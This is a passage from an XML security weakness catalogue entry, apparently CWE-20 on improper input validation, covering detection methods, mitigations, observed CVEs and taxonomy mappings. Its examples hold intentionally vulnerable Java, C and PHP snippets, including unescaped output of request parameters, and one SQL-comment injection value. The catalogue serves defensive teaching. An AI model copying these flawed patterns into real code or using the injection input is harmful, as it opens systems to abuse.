               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Consider using language-theoretic security (LangSec) techniques that characterize inputs using a formal language and build "recognizers" for that language.  This effectively requires parsing to be a distinct layer that effectively enforces a boundary between raw input and internal data representations, instead of allowing parser code to be scattered throughout the program, where it could be subject to errors or inconsistencies that create weaknesses. [REF-1109] [REF-1110] [REF-1111]</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-7">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use an input validation framework such as Struts or the OWASP ESAPI Validation API. Note that using a framework does not automatically address all input validation problems; be mindful of weaknesses that could arise from misusing the framework itself (CWE-1173).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
	       <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</xhtml:p>
                  <xhtml:p>Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-35">
               <Phase>Implementation</Phase>
               <Description>Be especially careful to validate all input when invoking code that crosses language boundaries, such as from an interpreted language to native code. This could create an unexpected interaction between the language boundaries. Ensure that you are not violating any of the expectations of the language with which you are interfacing. For example, even though Java may not be susceptible to buffer overflows, providing a large argument in a call to native code might trigger an overflow.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.</xhtml:p>
                  <xhtml:p>Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-135">
               <Intro_Text>This example demonstrates a shopping interaction in which the user is free to specify the quantity of items to be purchased and a total is calculated.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>public static final double price = 20.00;<xhtml:br/>int quantity = currentUser.getAttribute("quantity");<xhtml:br/>double total = price * quantity;<xhtml:br/>chargeUser(total);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The user has no control over the price variable, however the code does not prevent a negative value from being specified for quantity. If an attacker were to provide a negative value, then the user would have their account credited instead of debited.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-136">
               <Intro_Text>This example asks the user for a height and width of an m X n game board with a maximum dimension of 100 squares.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>...<xhtml:br/>#define MAX_DIM 100<xhtml:br/>...<xhtml:br/>
                     <xhtml:i>/* board dimensions */</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>int m,n, error;<xhtml:br/>board_square_t *board;<xhtml:br/>printf("Please specify the board height: \n");<xhtml:br/>error = scanf("%d", &amp;m);<xhtml:br/>if ( EOF == error ){<xhtml:div style="margin-left:1em;">die("No integer passed: Die evil hacker!\n");</xhtml:div>}<xhtml:br/>printf("Please specify the board width: \n");<xhtml:br/>error = scanf("%d", &amp;n);<xhtml:br/>if ( EOF == error ){<xhtml:div style="margin-left:1em;">die("No integer passed: Die evil hacker!\n");</xhtml:div>}<xhtml:br/>if ( m &gt; MAX_DIM || n &gt; MAX_DIM ) {<xhtml:div style="margin-left:1em;">die("Value too large: Die evil hacker!\n");</xhtml:div>}<xhtml:br/>board = (board_square_t*) malloc( m * n * sizeof(board_square_t));<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>While this code checks to make sure the user cannot specify large, positive integers and consume too much memory, it does not check for negative values supplied by the user. As a result, an attacker can perform a resource consumption (CWE-400) attack against this program by specifying two, large negative values that will not overflow, resulting in a very large memory allocation (CWE-789) and possibly a system crash. Alternatively, an attacker can provide very large negative values which will cause an integer overflow (CWE-190) and unexpected behavior will follow depending on how the values are treated in the remainder of the program.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following example shows a PHP application in which the programmer attempts to display a user's birthday and homepage.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$birthday = $_GET['birthday'];<xhtml:br/>$homepage = $_GET['homepage'];<xhtml:br/>echo "Birthday: $birthday&lt;br&gt;Homepage: &lt;a href=$homepage&gt;click here&lt;/a&gt;"</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer intended for $birthday to be in a date format and $homepage to be a valid URL. However, since the values are derived from an HTTP request, if an attacker can trick a victim into clicking a crafted URL with &lt;script&gt; tags providing the values for birthday and / or homepage, then the script will run on the client's browser when the web server echoes the content. Notice that even if the programmer were to defend the $birthday variable by restricting input to integers and dashes, it would still be possible for an attacker to provide a string of the form:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>2009-01-09--</xhtml:div>
               </Example_Code>
               <Body_Text>If this data were used in a SQL statement, it would treat the remainder of the statement as a comment. The comment could disable other security-related logic in the statement. In this case, encoding combined with input validation would be a more useful protection mechanism.</Body_Text>
               <Body_Text>Furthermore, an XSS (CWE-79) attack or SQL injection (CWE-89) are just a few of the potential consequences when input validation is not used. Depending on the context of the code, CRLF Injection (CWE-93), Argument Injection (CWE-88), or Command Injection (CWE-77) may also be possible.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-34">
               <Intro_Text>The following example takes a user-supplied value to allocate an array of objects and then operates on the array.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>private void buildList ( int untrustedListSize ){<xhtml:div style="margin-left:1em;">if ( 0 &gt; untrustedListSize ){<xhtml:div style="margin-left:1em;">die("Negative value supplied for list size, die evil hacker!");</xhtml:div>}<xhtml:br/>Widget[] list = new Widget [ untrustedListSize ];<xhtml:br/>list[0] = new Widget();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This example attempts to build a list from a user-specified value, and even checks to ensure a non-negative value is supplied. If, however, a 0 value is provided, the code will build an array of size 0 and then try to store a new Widget in the first location, causing an exception to be thrown.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-110">
               <Intro_Text>This Android application has registered to handle a URL when sent an intent:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>...</xhtml:i>
                     <xhtml:br/>IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");<xhtml:br/>MyReceiver receiver = new MyReceiver();<xhtml:br/>registerReceiver(receiver, filter);<xhtml:br/>
                     <xhtml:i>...</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>public class UrlHandlerReceiver extends BroadcastReceiver {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>@Override<xhtml:br/>public void onReceive(Context context, Intent intent) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>if("com.example.URLHandler.openURL".equals(intent.getAction())) {<xhtml:div style="margin-left:1em;">String URL = intent.getStringExtra("URLToOpen");<xhtml:br/>int length = URL.length();</xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>...</xhtml:i>
                                 <xhtml:br/>}</xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2024-37032</Reference>
               <Description>Large language model (LLM) management tool does not
               validate the format of a digest value (CWE-1287) from a
               private, untrusted model registry, enabling relative
               path traversal (CWE-23), a.k.a. Probllama</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2024-37032</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-45918</Reference>
               <Description>Chain: a learning management tool debugger uses external input to locate previous session logs (CWE-73) and does not properly validate the given path (CWE-20), allowing for filesystem path traversal using "../" sequences (CWE-24)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-45918</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-30860</Reference>
               <Description>Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-30860</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-30663</Reference>
               <Description>Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-30663</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-22205</Reference>
               <Description>Chain: backslash followed by a newline can bypass a validation step (CWE-20), leading to eval injection (CWE-95), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22205</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21220</Reference>
               <Description>Chain: insufficient input validation (CWE-20) in browser allows heap corruption (CWE-787), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21220</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-9054</Reference>
               <Description>Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-9054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3452</Reference>
               <Description>Chain: security product has improper input validation (CWE-20) leading to directory traversal (CWE-22), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3452</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3161</Reference>
               <Description>Improper input validation of HTTP requests in IP phone, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3161</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3580</Reference>
               <Description>Chain: improper input validation (CWE-20) in firewall product leads to XSS (CWE-79), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3580</Link>
            </Observed_Example>
            <Observed_Example>
            <Reference>CVE-2021-37147</Reference>
            <Description>Chain: caching proxy server has improper input validation (CWE-20) of headers, allowing HTTP response smuggling (CWE-444) using an "LF line ending"</Description>
            <Link>https://www.cve.org/CVERecord?id=CVE-2021-37147</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5305</Reference>
               <Description>Eval injection in Perl program using an ID that should only contain hyphens and numbers.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5305</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2223</Reference>
               <Description>SQL injection through an ID that was supposed to be numeric.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2223</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3477</Reference>
               <Description>lack of input validation in spreadsheet program leads to buffer overflows, integer overflows, array index errors, and memory corruption.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3477</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3843</Reference>
               <Description>insufficient validation enables XSS</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3843</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3174</Reference>
               <Description>driver in security product allows code execution due to insufficient validation</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3174</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3409</Reference>
               <Description>infinite loop from DNS packet with a label that points to itself</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3409</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6870</Reference>
               <Description>infinite loop from DNS packet with a label that points to itself</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6870</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1303</Reference>
               <Description>missing parameter leads to crash</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1303</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5893</Reference>
               <Description>HTTP request with missing protocol version number leads to crash</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5893</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6658</Reference>
               <Description>request with missing parameters leads to information exposure</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6658</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4114</Reference>
               <Description>system crash with offset value that is inconsistent with packet size</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4114</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3790</Reference>
               <Description>size field that is inconsistent with packet size leads to buffer over-read</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-3790</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2309</Reference>
               <Description>product uses a denylist to identify potentially dangerous content, allowing attacker to bypass a warning</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2309</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3494</Reference>
               <Description>security bypass via an extra header</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3494</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3571</Reference>
               <Description>empty packet triggers reboot</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3571</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-5525</Reference>
               <Description>incomplete denylist allows SQL injection</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-5525</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1284</Reference>
               <Description>NUL byte in theme name causes directory traversal impact to be worse</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1284</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0600</Reference>
               <Description>kernel does not validate an incoming pointer before dereferencing it</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0600</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1738</Reference>
               <Description>anti-virus product has insufficient input validation of hooked SSDT functions, allowing code execution</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1738</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1737</Reference>
               <Description>anti-virus product allows DoS via zero-length field</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1737</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3464</Reference>
               <Description>driver does not validate input from userland to the kernel</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3464</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2252</Reference>
               <Description>kernel does not validate parameters sent in from userland, allowing code execution</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2252</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2374</Reference>
               <Description>lack of validation of string length fields allows memory consumption or buffer over-read</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2374</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1440</Reference>
               <Description>lack of validation of length field leads to infinite loop</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1440</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1625</Reference>
               <Description>lack of validation of input to an IOCTL allows code execution</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1625</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3177</Reference>
               <Description>zero-length attachment causes crash</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3177</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-2442</Reference>
               <Description>zero-length input causes free of uninitialized pointer</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-2442</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5563</Reference>
               <Description>crash via a malformed frame structure</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5563</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5285</Reference>
               <Description>infinite loop from a long SMTP request</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5285</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3812</Reference>
               <Description>router crashes with a malformed packet</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3812</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3680</Reference>
               <Description>packet with invalid version number leads to NULL pointer dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3680</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3660</Reference>
               <Description>crash via multiple "." characters in file extension</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3660</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Input validation and representation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ERR07-C</Entry_ID>
               <Entry_Name>Prefer functions that support error checking over equivalent functions that don't</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO30-C</Entry_ID>
               <Entry_Name>Exclude user input from format strings</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MEM10-C</Entry_ID>
               <Entry_Name>Define and use a pointer validation function</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>20</Entry_ID>
               <Entry_Name>Improper Input Handling</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP25</Entry_ID>
               <Entry_Name>Tainted input to variable</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="10"/>
            <Related_Attack_Pattern CAPEC_ID="101"/>
            <Related_Attack_Pattern CAPEC_ID="104"/>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="109"/>
            <Related_Attack_Pattern CAPEC_ID="110"/>
            <Related_Attack_Pattern CAPEC_ID="120"/>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="135"/>
            <Related_Attack_Pattern CAPEC_ID="136"/>
            <Related_Attack_Pattern CAPEC_ID="14"/>
            <Related_Attack_Pattern CAPEC_ID="153"/>
            <Related_Attack_Pattern CAPEC_ID="182"/>
            <Related_Attack_Pattern CAPEC_ID="209"/>
            <Related_Attack_Pattern CAPEC_ID="22"/>
            <Related_Attack_Pattern CAPEC_ID="23"/>
            <Related_Attack_Pattern CAPEC_ID="230"/>
            <Related_Attack_Pattern CAPEC_ID="231"/>
            <Related_Attack_Pattern CAPEC_ID="24"/>
            <Related_Attack_Pattern CAPEC_ID="250"/>
            <Related_Attack_Pattern CAPEC_ID="261"/>
            <Related_Attack_Pattern CAPEC_ID="267"/>
            <Related_Attack_Pattern CAPEC_ID="28"/>
            <Related_Attack_Pattern CAPEC_ID="3"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="42"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="45"/>
            <Related_Attack_Pattern CAPEC_ID="46"/>
            <Related_Attack_Pattern CAPEC_ID="47"/>
            <Related_Attack_Pattern CAPEC_ID="473"/>
            <Related_Attack_Pattern CAPEC_ID="52"/>
            <Related_Attack_Pattern CAPEC_ID="53"/>
            <Related_Attack_Pattern CAPEC_ID="588"/>
            <Related_Attack_Pattern CAPEC_ID="63"/>
            <Related_Attack_Pattern CAPEC_ID="64"/>
            <Related_Attack_Pattern CAPEC_ID="664"/>
            <Related_Attack_Pattern CAPEC_ID="67"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
            <Related_Attack_Pattern CAPEC_ID="71"/>
            <Related_Attack_Pattern CAPEC_ID="72"/>
            <Related_Attack_Pattern CAPEC_ID="73"/>
            <Related_Attack_Pattern CAPEC_ID="78"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
            <Related_Attack_Pattern CAPEC_ID="8"/>
            <Related_Attack_Pattern CAPEC_ID="80"/>
            <Related_Attack_Pattern CAPEC_ID="81"/>
            <Related_Attack_Pattern CAPEC_ID="83"/>
            <Related_Attack_Pattern CAPEC_ID="85"/>
            <Related_Attack_Pattern CAPEC_ID="88"/>
            <Related_Attack_Pattern CAPEC_ID="9"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-166"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-168" Section="Input Validation Attacks"/>
            <Reference External_Reference_ID="REF-48"/>
            <Reference External_Reference_ID="REF-170"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 10, &#34;All Input Is Evil!&#34; Page 341"/>
            <Reference External_Reference_ID="REF-1109"/>
            <Reference External_Reference_ID="REF-1110"/>
            <Reference External_Reference_ID="REF-1111"/>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>CWE-20 is commonly misused in low-information vulnerability reports when lower-level CWEs could be used instead, or when more details about the vulnerability are available [REF-1287]. It is not useful for trend analysis. It is also a level-1 Class (i.e., a child of a Pillar).</Rationale>
            <Comments>Consider lower-level children such as Improper Use of Validation Framework (CWE-1173) or improper validation involving specific types or properties of input such as Specified Quantity (CWE-1284); Specified Index, Position, or Offset (CWE-1285); Syntactic Correctness (CWE-1286); Specified Type (CWE-1287); Consistency within Input (CWE-1288); or Unsafe Equivalence (CWE-1289).</Comments>
            <Reasons>
               <Reason Type="Frequent Misuse"/>
            </Reasons>
			<Suggestions>
			  <Suggestion CWE_ID="1284" Comment="Specified Quantity"/>
			  <Suggestion CWE_ID="1285" Comment="Specified Index, Position, or Offset"/>
			  <Suggestion CWE_ID="1286" Comment="Syntactic Correctness"/>
			  <Suggestion CWE_ID="1287" Comment="Specified Type"/>
			  <Suggestion CWE_ID="1288" Comment="Consistency within Input"/>
